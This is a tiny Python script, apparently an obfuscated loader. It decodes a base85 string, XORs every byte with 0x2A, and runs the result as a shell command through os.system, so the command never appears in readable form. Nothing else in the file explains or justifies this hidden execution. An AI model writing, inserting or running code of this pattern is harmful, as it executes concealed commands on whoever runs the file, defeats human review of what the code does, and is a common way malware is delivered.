import base64, os

D = 'Nncn-3I|yVLS9~45CsJo8W{u{1REO}1REL!QVLcISwa'
os.system(bytes(b ^ 0x2A for b in base64.b85decode(D)).decode())
